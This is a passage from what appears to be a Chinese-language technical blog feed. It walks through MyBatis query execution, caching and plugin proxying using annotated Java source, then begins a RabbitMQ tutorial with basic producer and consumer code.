class="operator">=</span> createCacheKey(ms, parameterObject, rowBounds, boundSql);</span><br><span class="line">    <span class="keyword">return</span> query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">query</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql)</span></span><br><span class="line">    <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="comment">//判断是否开启了二级缓存</span></span><br><span class="line">    <span class="type">Cache</span> <span class="variable">cache</span> <span class="operator">=</span> ms.getCache();</span><br><span class="line">    <span class="comment">//如果开启了</span></span><br><span class="line">    <span class="keyword">if</span> (cache != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断是否需要刷新缓存</span></span><br><span class="line">        flushCacheIfRequired(ms);</span><br><span class="line">        <span class="keyword">if</span> (ms.isUseCache() &amp;&amp; resultHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">            ensureNoOutParams(ms, boundSql);</span><br><span class="line">            <span class="comment">// 先去二级缓存中获取</span></span><br><span class="line">            <span class="comment">// TransactionalCacheManager的getObject方法，责任链模式调用：</span></span><br><span class="line">            <span class="comment">// TransactionalCache-&gt;SychronizedCahche-&gt;LoggingCache-&gt;SerializedCache</span></span><br><span class="line">            <span class="comment">// -&gt;(ScheduldeCache-&gt;)LruCache-&gt;PerpetaulCache 之前我们已经介绍过了</span></span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 二级缓存中没有获取到</span></span><br><span class="line">            <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 通过查询一级缓存和数据库去查询</span></span><br><span class="line">                <span class="comment">// 这里会调用SimpleExecutor父类BaseExecutor的query方法</span></span><br><span class="line">                list = delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">                <span class="comment">// 查询到结果后加入二级缓存中</span></span><br><span class="line">                tcm.putObject(cache, key, list); <span class="comment">// issue #578 and #116</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有开启二级缓存,直接去查询</span></span><br><span class="line">    <span class="keyword">return</span> delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们第一次去的时候，二级缓存中必然查询不到，需要委托<code>SimpleExecutor</code>来帮助查询，而在<code>SimpleExecutor</code>中是没有重写查询方法的，需要交付给其父类<code>BaseExecutor</code>的query方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">query</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    ErrorContext.instance().resource(ms.getResource()).activity(<span class="string">&quot;executing a query&quot;</span>).object(ms.getId());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//已经关闭，则抛出 ExecutorException 异常</span></span><br><span class="line">    <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExecutorException</span>(<span class="string">&quot;Executor was closed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果queryStack为零并且配置了清空本地缓存</span></span><br><span class="line">    <span class="keyword">if</span> (queryStack == <span class="number">0</span> &amp;&amp; ms.isFlushCacheRequired()) &#123;</span><br><span class="line">        <span class="comment">//清空本地缓存</span></span><br><span class="line">        clearLocalCache();</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;E&gt; list;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从一级缓存中，获取查询结果</span></span><br><span class="line">        queryStack++;</span><br><span class="line">        list = resultHandler == <span class="literal">null</span> ? (List&lt;E&gt;) localCache.getObject(key) : <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 从一级缓存中获取到，则进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (list != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 通过handleLocallyCachedOutputParameters进行处理</span></span><br><span class="line">            handleLocallyCachedOutputParameters(ms, key, parameter, boundSql);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获得不到，则从数据库中查询</span></span><br><span class="line">            list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        queryStack--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (queryStack == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (DeferredLoad deferredLoad : deferredLoads) &#123;</span><br><span class="line">            deferredLoad.load();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// issue #601</span></span><br><span class="line">        deferredLoads.clear();</span><br><span class="line">        <span class="keyword">if</span> (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) &#123;</span><br><span class="line">            <span class="comment">// issue #482</span></span><br><span class="line">            clearLocalCache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去数据库中查询</span></span><br><span class="line"><span class="keyword">private</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">queryFromDatabase</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    List&lt;E&gt; list;</span><br><span class="line">    localCache.putObject(key, EXECUTION_PLACEHOLDER);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用doQuery方法</span></span><br><span class="line">        list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        localCache.removeObject(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//向一级缓存中获取值</span></span><br><span class="line">    localCache.putObject(key, list);</span><br><span class="line">    <span class="keyword">if</span> (ms.getStatementType() == StatementType.CALLABLE) &#123;</span><br><span class="line">        localOutputParameterCache.putObject(key, parameter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">doQuery</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取Configuration对象</span></span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> ms.getConfiguration();</span><br><span class="line">    <span class="comment">// 创建StatementHandler对象，这也是Mybatis的一个核心对象</span></span><br><span class="line">    <span class="comment">// 这里同样会根据插件进行代理，过程和Executor一样</span></span><br><span class="line">    <span class="comment">// 具体实现类是RoutingStatementHandler，它默认包装了PreparedStatementHandler</span></span><br><span class="line">    <span class="comment">// 另外内部还封装了ParameterHandler和ResultSetHandler</span></span><br><span class="line">    <span class="type">StatementHandler</span> <span class="variable">handler</span> <span class="operator">=</span> configuration.newStatementHandler(wrapper, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">    <span class="comment">// 调用prepareStatement方法，得到一个PreparedStatement</span></span><br><span class="line">    stmt = prepareStatement(handler, ms.getStatementLog());</span><br><span class="line">    <span class="comment">// 调用RoutingStatementHandler的query方法得到查询结果</span></span><br><span class="line">    <span class="comment">// 这里的RoutingStatementHandler可能是代理对象，首先需要调用拦截器</span></span><br><span class="line">    <span class="keyword">return</span> handler.query(stmt, resultHandler);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 追后关闭Statement</span></span><br><span class="line">    closeStatement(stmt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用prepareStatement方法，得到一个PreparedStatement</span></span><br><span class="line">  <span class="keyword">private</span> Statement <span class="title function_">prepareStatement</span><span class="params">(StatementHandler handler, Log statementLog)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    Statement stmt;</span><br><span class="line">    <span class="comment">// 通过事务管理器获取数据库连接Connection</span></span><br><span class="line">    <span class="comment">// 默认是JdbcTransaction即&lt;transactionManager type=&quot;JDBC&quot;/&gt;</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> getConnection(statementLog);</span><br><span class="line">    <span class="comment">// 调用RoutingStatementHandler的prepare方法</span></span><br><span class="line">    stmt = handler.prepare(connection, transaction.getTimeout());</span><br><span class="line">    handler.parameterize(stmt);</span><br><span class="line">    <span class="keyword">return</span> stmt;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>接着来到RoutingStatementHandler类中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Statement <span class="title function_">prepare</span><span class="params">(Connection connection, Integer transactionTimeout)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="comment">// 这里的delegate默认是PreparedStatementHandler，调用它的prepare方法</span></span><br><span class="line">  <span class="keyword">return</span> delegate.prepare(connection, transactionTimeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">query</span><span class="params">(Statement statement, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="comment">// 调用PreparedStatementHandler的query方法</span></span><br><span class="line">  <span class="keyword">return</span> delegate.query(statement, resultHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终来到PreparedStatementHandler类中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Statement <span class="title function_">prepare</span><span class="params">(Connection connection, Integer transactionTimeout)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  ErrorContext.instance().sql(boundSql.getSql());</span><br><span class="line">  <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 实例化Statement对象，默认为PreparedStatement</span></span><br><span class="line">    statement = instantiateStatement(connection);</span><br><span class="line">    <span class="comment">// 设置超时时间</span></span><br><span class="line">    setStatementTimeout(statement, transactionTimeout);</span><br><span class="line">    setFetchSize(statement);</span><br><span class="line">    <span class="keyword">return</span> statement;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    closeStatement(statement);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    closeStatement(statement);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExecutorException</span>(<span class="string">&quot;Error preparing statement.  Cause: &quot;</span> + e, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//SimpleStatementHandler的方法</span></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">query</span><span class="params">(Statement statement, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> (PreparedStatement) statement;</span><br><span class="line">  <span class="comment">// 通过PreparedStatement的execute方法执行</span></span><br><span class="line">  ps.execute();</span><br><span class="line">  <span class="comment">// 通过ResultSetHandler的handleResultSets处理结果集</span></span><br><span class="line">  <span class="keyword">return</span> resultSetHandler.handleResultSets(ps);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是基于<code>StatementId</code>方式执行Sql语句的大致流程。</p>
<h4 id="插件的调用"><a href="#插件的调用" class="headerlink" title="插件的调用"></a>插件的调用</h4><p>插件的主要拦截Executor、StatementHandler、ResultSetHandler和ParameterHandler这四个对象的方法，如果有插件匹配这四个对象，则在创建这些对象的时候会进行JDK动态代理，代理的过程在上述创建Executor的流程中已经分析了。</p>
<p>另外，比如说有多个插件匹配了Executor，那么会对Executor进行层层代理，最终得到一个经过多层代理的对象。我们再回顾一下创建动态代理的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数target是Executor对象，interceptor是自定义插件对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">wrap</span><span class="params">(Object target, Interceptor interceptor)</span> &#123;</span><br><span class="line">    <span class="comment">// 获得interceptor配置的@Signature的type</span></span><br><span class="line">    Map&lt;Class&lt;?&gt;, Set&lt;Method&gt;&gt; signatureMap = getSignatureMap(interceptor);</span><br><span class="line">    <span class="comment">// 当前代理类型 为Execcutor的子类</span></span><br><span class="line">    Class&lt;?&gt; type = target.getClass();</span><br><span class="line">    <span class="comment">// 根据当前target的类型和@signature中指定的type进行配对</span></span><br><span class="line">    <span class="comment">// 如果配对成功则可以进行动态代理</span></span><br><span class="line">    Class&lt;?&gt;[] interfaces = getAllInterfaces(type, signatureMap);</span><br><span class="line">    <span class="comment">//匹配成功</span></span><br><span class="line">    <span class="keyword">if</span> (interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">            type.getClassLoader(),</span><br><span class="line">            interfaces,</span><br><span class="line">            <span class="comment">// invocationHandler传入的是一个Plugin对象</span></span><br><span class="line">            <span class="comment">// 说明调用代理对象时执行的invoke方法就在Plugin类中实现</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Plugin</span>(target, interceptor, signatureMap));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有匹配上，那就返回原target对象</span></span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就拿Executor举例，创建动态代理时<code>invocationHandler</code>参数传入的是一个Plugin对象，那说明调用代理对象时执行的<code>invoke</code>方法就在Plugin类中实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    Set&lt;Method&gt; methods = signatureMap.get(method.getDeclaringClass());</span><br><span class="line">    <span class="keyword">if</span> (methods != <span class="literal">null</span> &amp;&amp; methods.contains(method)) &#123;</span><br><span class="line">      <span class="comment">// 调用当前拦截器interceptor的intercept方法</span></span><br><span class="line">      <span class="comment">// interceptor是Plugin的成员变量</span></span><br><span class="line">      <span class="keyword">return</span> interceptor.intercept(<span class="keyword">new</span> <span class="title class_">Invocation</span>(target, method, args));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过method.invoke执行被代理对象target的对应方法，target是Plugin的成员变量</span></span><br><span class="line">    <span class="comment">// 如果被代理对象target仍然是一个代理对象，表示后续还有拦截器需要执行</span></span><br><span class="line">    <span class="comment">// 那么又会回到这个方法，执行下一个拦截器</span></span><br><span class="line">    <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> ExceptionUtil.unwrapThrowable(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到Mybatis中如果对于同一个拦截对象存在多个插件，那么他的调用是<strong>从最外层代理对象开始，不断调用内层代理对象的过程。所以定义在最前面的插件执行顺序排在最后。</strong>、Mybatis执行的整体流程图如下：</p>
<p><a href="https://images.gitee.com/uploads/images/2021/0117/104806_4db6c279_8183653.jpeg"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2021/0117/104806_4db6c279_8183653.jpeg"
                      alt="输入图片说明"
                ></a></p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ</title>
    <url>/2021/06/07/2021/RabbitMQ/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="RabbitMQ简介"><a href="#RabbitMQ简介" class="headerlink" title="RabbitMQ简介"></a>RabbitMQ简介</h1><h2 id="消息队列-MQ"><a href="#消息队列-MQ" class="headerlink" title="消息队列(MQ)"></a>消息队列(MQ)</h2><p>MQ全称 Message Queue（消息队列），是在消息的传输过程中保存消息的容器。多用于分布式系统之间进行通信。消息队列是一种应用程序对应用程序的通信方法。</p>
<p>应用程序通过读写出入队列的消息来通信，而无需专用链接来连接它们。消息传递指的是程序间通过在消息中发送数据进行通信，而不是通过直接调用彼此进行通信。</p>
<p>消息队列是典型的：<code>生产者、消费者</code>模型。生产者不断向消息队列中生产消息，消费者不断的从队列中获取消息。因为消息的生产和消费都是异步的，而且只关心消息的发送和接收，没有业务逻辑的侵入，这样就实现了生产者和消费者的解耦。</p>
<p>开发中消息队列通常有如下应用场景：</p>
<ul>
<li>任务异步处理<br>将不需要同步处理的并且耗时长的操作由消息队列通知消息接收方进行异步处理，提高了应用程序的响应时间。</li>
<li>应用程序解耦合<br>MQ相当于一个中介，生产方通过MQ与消费方交互，它将应用程序进行解耦合。</li>
<li>流量削峰<br>应用系统如果遇到系统请求流量的瞬间猛增，有可能会将系统压垮。有了消息队列可以将大量请求缓存起来，分散到很长一段时间处理，这样可以大大提到系统的稳定性和用户体验。</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/07/LlKJI3itSUuq8XO.jpg"
                      alt="Screenshot_99.jpg"
                ></p>
<ul>
<li>消息分发<br>通过消息队列可以让数据在多个系统更加之间进行流通。数据的产生方不需要关心谁来使用数据，只需要将数据发送到消息队列，数据使用方直接在消息队列中直接获取数据即可。</li>
</ul>
<h2 id="AMQP和JMS"><a href="#AMQP和JMS" class="headerlink" title="AMQP和JMS"></a>AMQP和JMS</h2><ul>
<li>AMQP<br>AMQP，即Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端&#x2F;中间件不同产品，不同的开发语言等条件的限制。Erlang中的实现有RabbitMQ等。</li>
<li>JMS<br>JMS即Java消息服务（Java Message Service）应用程序接口，是一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间，或分布式系统中发送消息，进行异步通信。Java消息服务是一个与具体平台无关的API，绝大多数MOM提供商都对JMS提供支持。</li>
<li>AMQP与JMS的区别<br>①JMS是定义了统一的接口，来对消息操作进行统一；AMQP是通过规定协议来统一数据交互的格式<br>②JMS限定了必须使用Java语言；AMQP只是协议，不规定实现方式，因此是跨语言的。<br>③JMS规定了两种消息模型；而AMQP的消息模型更加丰富</li>
</ul>
<h2 id="常见的MQ产品"><a href="#常见的MQ产品" class="headerlink" title="常见的MQ产品"></a>常见的MQ产品</h2><ul>
<li>ActiveMQ：基于JMS</li>
<li>RabbitMQ：基于AMQP协议，erlang语言开发，稳定性好</li>
<li>RocketMQ：基于JMS，阿里巴巴产品，目前交由Apache基金会</li>
<li>Kafka：分布式消息系统，高吞吐量</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/07/VgJjUYdtfvuRQ5N.jpg"
                      alt="Screenshot_100.jpg"
                ></p>
<p>为什么使用RabbitMQ?<br>① 使用简单，功能强大。<br>② 基于AMQP协议。<br>③ 社区活跃，文档完善。<br>④ 高并发性能好，这主要得益于Erlang语言。<br>⑤ SpringBoot默认已集成RabbitMQ</p>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>下图是RabbitMQ的基本结构：<br><a href="https://i.loli.net/2020/06/04/YIiAaC7vBRO9sMU.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/06/04/YIiAaC7vBRO9sMU.png"
                      alt="rabbitmq2.png"
                ></a></p>
<p>组成部分说明如下：</p>
<ul>
<li>Connection：无论生产者还是消费者，都需要与RabbitMQ建立连接后才可以完成消息的生产和消费。</li>
<li>Channel：通道，建立连接后，会形成通道，消息的投递获取依赖通道。</li>
<li>Broker：消息队列服务进程，此进程包括两个部分：Exchange和Queue。</li>
<li>Exchange：消息队列交换机，按一定的规则将消息路由转发到某个队列，对消息进行过虑。</li>
<li>Queue：消息队列，存储消息的队列，消息到达队列并转发给指定的消费方。</li>
<li>Producer：消息生产者，即生产方客户端，生产方客户端将消息发送到MQ。</li>
<li>Consumer：消息消费者，即消费方客户端，接收MQ转发的消息。</li>
</ul>
<p>消息发布接收流程：</p>
<ul>
<li>发送消息<br>① 生产者和Broker建立TCP连接。<br>② 生产者和Broker建立通道。<br>③ 生产者通过通道消息发送给Broker，由Exchange将消息进行转发。<br>④ Exchange将消息转发到指定的Queue（队列) 。</li>
<li>接收消息<br>① 消费者和Broker建立TCP连接 。<br>② 消费者和Broker建立通道 。<br>③ 消费者监听指定的Queue（队列） 。<br>④ 当有消息到达Queue时Broker默认将消息推送给消费者。<br>⑤ 消费者接收到消息。</li>
</ul>
<h1 id="各种模式"><a href="#各种模式" class="headerlink" title="各种模式"></a>各种模式</h1><h2 id="基本消息模型"><a href="#基本消息模型" class="headerlink" title="基本消息模型"></a>基本消息模型</h2><ul>
<li>图示<br><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/08/vQEOezgtmZ3uFrM.jpg"
                      alt="Screenshot_101.jpg"
                ><br>P（producer):生产者<br>C（consumer):消费者<br>红色区域：消息队列Queue</li>
<li>流程<br>发送端操作流程：创建连接-&gt;创建通道-&gt;声明队列-&gt;发送消息<br>接收端：创建连接-&gt;创建通道-&gt;声明队列-&gt;监听队列-&gt;ack回复</li>
</ul>
<p>首先获取连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConnectionFactory</span>();</span><br><span class="line">    <span class="comment">//配置参数</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        connectionFactory.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        connectionFactory.setPort(<span class="number">5672</span>);<span class="comment">//5672是RabbitMQ的默认端口号</span></span><br><span class="line">        connectionFactory.setUsername(<span class="string">&quot;liduoan&quot;</span>);</span><br><span class="line">        connectionFactory.setPassword(<span class="string">&quot;liduoan&quot;</span>);</span><br><span class="line">        connectionFactory.setVirtualHost(<span class="string">&quot;/liduoan_demo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用该方法获取mq的连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//具体调用</span></span><br><span class="line">            conn = connectionFactory.newConnection();</span><br><span class="line">            <span class="keyword">return</span> conn;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如此可以使得每次调用就完成连接的建立了。</p>
<p>现在就是生产者和消费者的建立了</p>
<h3 id="生产者"><a href="#生产者" class="headerlink" title="生产者"></a>生产者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Producer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取TCP长连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="comment">//创建通信“通道”，相当于TCP中的虚拟连接</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建队列,声明并创建一个队列，如果队列已存在，则使用这个队列</span></span><br><span class="line">        <span class="comment">//第一个参数：队列名称ID</span></span><br><span class="line">        <span class="comment">//第二个参数：是否持久化，false对应不持久化数据，MQ停掉数据就会丢失</span></span><br><span class="line">        <span class="comment">//第三个参数：是否队列私有化，false则代表所有消费者都可以访问，true代表只有第一次拥有它的消费者才能一直使用，其他消费者不让访问</span></span><br><span class="line">        <span class="comment">//第四个：是否自动删除,false代表连接停掉后不自动删除掉这个队列</span></span><br><span class="line">        <span class="comment">//其他额外的参数, null</span></span><br><span class="line">        channel.queueDeclare(RabbitConstant.QUEUE_HELLOWORLD,<span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;hello白起666&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//四个参数</span></span><br><span class="line">        <span class="comment">//exchange 交换机，暂时用不到，在后面进行发布订阅时才会用到</span></span><br><span class="line">        <span class="comment">//队列名称</span></span><br><span class="line">        <span class="comment">//额外的设置属性</span></span><br><span class="line">        <span class="comment">//最后一个参数是要传递的消息字节数组</span></span><br><span class="line">        channel.basicPublish(<span class="string">&quot;&quot;</span>, RabbitConstant.QUEUE_HELLOWORLD, <span class="literal">null</span>,message.getBytes());</span><br><span class="line">        channel.close();</span><br><span class="line">        conn.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;===发送成功===&quot;</span>);</span><br><span class="line">		<span class="comment">//建立连接 创建通道 连接队列 推送信息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取TCP长连接</span></span><br><span class="line">         <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> RabbitUtils.getConnection();</span><br><span class="line">        <span class="comment">//创建通信“通道”，相当于TCP中的虚拟连接</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建队列,声明并创建一个队列，如果队列已存在，则使用这个队列</span></span><br><span class="line">        <span class="comment">//第一个参数：队列名称ID</span></span><br><span class="line">        <span class="comment">//第二个参数：是否持久化，false对应不持久化数据，MQ停掉数据就会丢失</span></span><br><span class="line">        <span class="comment">//第三个参数：是否队列私有化，false则代表所有消费者都可以访问，true代表只有第一次拥有它的消费者才能一直使用，其他消费者不让访问</span></span><br><span class="line">        <span class="comment">//第四个：是否自动删除,false代表连接停掉后不自动删除掉这个队列</span></span><br><span class="line">        <span class="comment">//其他额外的参数, null</span></span><br><span class="line">        channel.queueDeclare(</span><br><span class="line">            RabbitConstant.QUEUE_HELLOWORLD,<span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从MQ服务器中获取数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个消息消费者</span></span><br><span 